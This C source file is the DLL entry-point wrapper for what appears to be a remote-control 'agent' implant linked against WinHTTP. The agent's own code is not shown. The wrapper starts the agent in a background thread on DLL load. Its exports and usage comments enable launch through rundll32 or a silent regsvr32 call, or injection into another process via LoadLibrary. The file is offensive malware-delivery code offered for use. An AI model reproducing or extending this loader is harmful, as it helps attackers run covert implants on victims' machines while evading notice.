/* DLL entry point — starts agent in a new thread when loaded
 * Build: x86_64-w64-mingw32-gcc -shared -o agent.dll agent.c ghost_data.c dllmain.c -lwinhttp -lm
 * Use:
 *   rundll32.exe agent.dll,Start
 *   regsvr32 /s agent.dll
 *   Or inject via LoadLibrary from another process
 */

#include <windows.h>

/* Forward declaration of agent main from agent.c */
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow);

static DWORD WINAPI AgentThread(LPVOID lpParam) {
    WinMain(NULL, NULL, NULL, 0);
    return 0;
}

/* Standard DLL entry point */
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    switch (reason) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, AgentThread, NULL, 0, NULL);
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

/* Exported functions for rundll32 / regsvr32 compatibility */
__declspec(dllexport) void Start(void) {
    CreateThread(NULL, 0, AgentThread, NULL, 0, NULL);
}

__declspec(dllexport) HRESULT DllRegisterServer(void) {
    CreateThread(NULL, 0, AgentThread, NULL, 0, NULL);
    return S_OK;
}

__declspec(dllexport) HRESULT DllUnregisterServer(void) {
    return S_OK;
}
